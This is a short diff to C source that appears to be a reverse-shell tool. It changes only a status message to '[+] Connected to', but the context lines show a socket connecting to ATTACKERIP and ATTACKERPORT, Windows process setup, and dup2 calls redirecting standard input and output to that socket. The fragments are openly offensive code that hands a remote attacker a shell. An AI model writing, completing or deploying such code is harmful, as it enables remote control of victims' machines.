@@ -38,7 +38,7 @@ int main() {
         return 1;
     }
 
-    printf("Connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
+    printf("[+] Connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
 
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -68,7 +68,7 @@ int main() {
     if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0)
         return 1;
 
-    printf("Connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
+    printf("[+] Connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
 
     dup2(s, 0);
     dup2(s, 1);
